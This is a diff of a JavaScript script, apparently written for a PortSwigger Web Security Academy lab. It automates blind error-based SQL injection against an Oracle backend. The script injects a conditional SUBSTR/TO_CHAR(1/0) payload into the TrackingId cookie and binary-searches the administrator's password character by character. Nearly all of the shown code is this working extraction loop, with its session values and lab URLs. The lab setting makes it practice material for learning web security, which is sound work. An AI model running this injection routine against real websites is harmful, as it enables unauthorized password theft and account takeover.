@@ -55,9 +55,8 @@ async function run2() {
       await request({
         url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
         path: '/filter?category=Gifts',
-        trackingId: '12knXqNU7IoiLmNp',
+        trackingId: `12knXqNU7IoiLmNp' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, ${charAt}, 1) > '${char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
         session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
-        query: `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, ${charAt}, 1) > '${char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
       });
 
       remainingChars = remainingChars.slice(
@@ -71,9 +70,8 @@ async function run2() {
             await request({
               url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
               path: '/filter?category=Gifts',
-              trackingId: '12knXqNU7IoiLmNp',
+              trackingId: `12knXqNU7IoiLmNp' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, ${charAt}, 1) > '${char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
               session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
-              query: `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, ${charAt}, 1) > '${char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
             });
 
             throw new Error('Finalizo la busqueda');
@@ -92,8 +90,8 @@ async function run2() {
       char = remainingChars[Math.floor(remainingChars.length / 2) - 1];
     } catch (err) {
       if (err.message === 'Finalizo la busqueda') {
-       console.log('Finalizo la busqueda');
-       break;
+        console.log('Finalizo la busqueda');
+        break;
       }
 
       remainingChars = remainingChars.slice(
@@ -112,22 +110,21 @@ async function run2() {
   }
 }
 
-run2();
+// run2();
 
 async function runIndividual() {
   try {
     const response = await request({
-      url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
-      path: '/filter?category=Gifts',
-      trackingId: '12knXqNU7IoiLmNp',
-      session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
-      query: `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
+      url: 'https://0aa9009e049b1c7183f1c42d00fb00c4.web-security-academy.net',
+      path: '/filter?category=Pets',
+      trackingId: `ERTArPFKFta1qNj3`,
+      session: 'oxHzhnIssAq2Ls7xw1yclo2QgyAgFKik',
     });
 
-    return 'SUCEED';
+    console.log('SUCEED');
   } catch (err) {
-    return 'FAILED';
+    console.log(err);
   }
 }
 
-// runIndividual();
+runIndividual();
